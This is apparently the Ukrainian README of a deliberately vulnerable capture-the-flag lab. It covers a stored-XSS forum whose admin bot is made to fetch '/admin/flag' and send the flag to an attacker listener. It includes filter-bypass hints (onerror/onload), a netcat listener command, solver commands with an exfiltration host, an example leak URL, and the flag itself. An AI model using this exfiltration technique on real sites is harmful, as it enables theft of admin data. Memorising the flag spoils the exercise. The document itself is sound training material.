# NullByte Forum — CTF на stored XSS

Навчальний CTF-застосунок: анонімний форум, у якому можна залишити HTML.
Флаг лежить **тільки в адмін-панелі**. Адмін-бот (headless Chromium) сам
заходить під адміном і відкриває пост, на який ти поскаржився. Отже, флаг
треба викрасти з його браузера через XSS.

```
CTF{st0r3d_x55_1n_4dm1n_b07}
```

> [!WARNING]
> Це навмисно вразливий застосунок для навчання. Не виставляй його в інтернет.
> Запускай лише локально або в ізольованій лабораторії.

---

## Що всередині

| Компонент | Навіщо |
|---|---|
| Flask-форум | пости, скарги, адмінка з флагом |
| Адмін-бот | Playwright + Chromium, логіниться і відкриває пост зі скарги |
| Слабкий фільтр | видаляє `<script>` і `javascript:`, але не `onerror`/`onload` |
| `/admin/flag` | JSON із флагом, доступний лише адмінській сесії |
| `solve/` | listener, payload і автоматичний солвер |

Пароль адміна генерується випадково при старті (якщо не заданий
`ADMIN_PASSWORD`), тому напряму залогінитись не вийде — тільки через XSS.

---

## Запуск

### Варіант 1 — Docker (рекомендовано)

Потрібен Docker Desktop / Docker Engine + Compose.

```bash
cd xss-ctf
docker compose up --build
```

Перший білд довгий: ставиться Chromium. Коли підніметься:

```bash
curl http://localhost:5000/healthz
# {"bot":true,"status":"ok"}
```

Сайт: <http://localhost:5000>

### Варіант 2 — чистий Python

Потрібен Python 3.10+.

```bash
cd xss-ctf
python -m venv .venv
# Windows:
.venv\Scripts\activate
# Linux / Kali:
source .venv/bin/activate

pip install -r requirements.txt
playwright install chromium
# Linux/Kali, якщо бракує системних бібліотек:
# playwright install --with-deps chromium

python run.py
```

Сайт: <http://127.0.0.1:5000>

Якщо Playwright не встановлено, форум запуститься, але бот буде вимкнений
(`/healthz` покаже `"bot":false`), і скарги не працюватимуть.

---

## Правила / мета

1. Знайти XSS на форумі.
2. Змусити адмін-бота виконати твій JS.
3. Викрасти флаг з адмінської сесії на свій listener.

Флаг має формат `CTF{...}`.

Підказки:

- Зверни увагу, що форма дозволяє HTML, а фільтр прибирає не все.
- Сторінка поста рендерить текст як HTML (`|safe`).
- Кнопка «Поскаржитись модератору» відправляє бота саме на цей пост.
- Флаг доступний за `/admin/flag`, але тільки з адмінською cookie.
- Cookie сесії `HttpOnly` — `document.cookie` не допоможе. Потрібен
  `fetch('/admin/flag')` зі сторінки, яку відкрив бот.

---

## Kali-інструменти, які тут доречні

- **curl** — створити пост і смикнути `/report/<id>` без браузера.
- **python3 -m http.server 8000** — listener; флаг видно в access-лозі.
- **nc -lvnp 8000** (netcat) — побачиш сирий HTTP-запит із флагом.
- **Burp Suite / OWASP ZAP** — перехопити `POST /new` і `POST /report/<id>`,
  підмінити body, повторити запит.
- **dalfox / XSStrike** — можна швидко прогнати payload-и, але це stored XSS
  за адмін-сесією, тому ручний listener + скарга надійніші.
- **ffuf / gobuster** — не обов'язково, але `/admin`, `/admin/flag`,
  `/report/<id>` добре видно в директоріях.

Мінімальний набір: `curl` + `python3` (або `nc`).

---

## Швидке рішення

Повний розбір — у [WRITEUP.md](WRITEUP.md).

```bash
# 1. Listener на хості (Kali або Windows)
python3 solve/listener.py

# 2. В іншому терміналі — автоматичний солвер
python3 solve/solve.py --exfil-host host.docker.internal
# локальний Python-запуск:
# python3 solve/solve.py --exfil-host 127.0.0.1
```

Або вручну: створи пост із payload з `solve/payload.txt`, натисни
«Поскаржитись модератору» і дивись на listener.

---

## Налаштування

Через `.env` (скопіюй `.env.example`) або змінні оточення:

| Змінна | За замовчуванням | Опис |
|---|---|---|
| `CTF_FLAG` | `CTF{st0r3d_x55_1n_4dm1n_b07}` | флаг |
| `ADMIN_USER` | `admin` | логін адміна |
| `ADMIN_PASSWORD` | випадковий | пароль адміна |
| `BOT_COOLDOWN` | `10` | секунд між скаргами з одного IP |
| `BOT_VISIT_SECONDS` | `7` | скільки бот тримає сторінку відкритою |
| `BOT_ENABLED` | `1` | `0` — вимкнути бота |
| `APP_BASE_URL` | `http://127.0.0.1:5000` | куди бот ходить |

Приклад для Docker:

```bash
CTF_FLAG='CTF{my_custom_flag}' docker compose up --build
```

Скинути стан (пости + БД):

```bash
docker compose down -v
```

Локально — видали `data/forum.db`.

---

## Мережа: чому `host.docker.internal`

Бот живе **всередині контейнера**, а listener — на твоїй машині. Тому в
payload для Docker використовується `host.docker.internal` (у compose вже
доданий `extra_hosts` для Linux). Для локального Python-запуску бот і
listener на одній машині — пиши `127.0.0.1`.

Якщо Kali стоїть у VM, а Docker — на іншій машині, `host.docker.internal`
вкаже на хост Docker, а не на Kali. У такому разі в payload вкажи LAN-IP
Kali, наприклад `http://192.168.1.50:8000/leak?f=...`, і відкрий порт 8000
у firewall.

---

## Дисклеймер

Усі вразливості навмисні: відсутність екранування, слабкий blacklist-фільтр,
бот із адмін-сесією, відсутність CSRF/CSP. Код не можна використовувати як
основу для реального продукту.
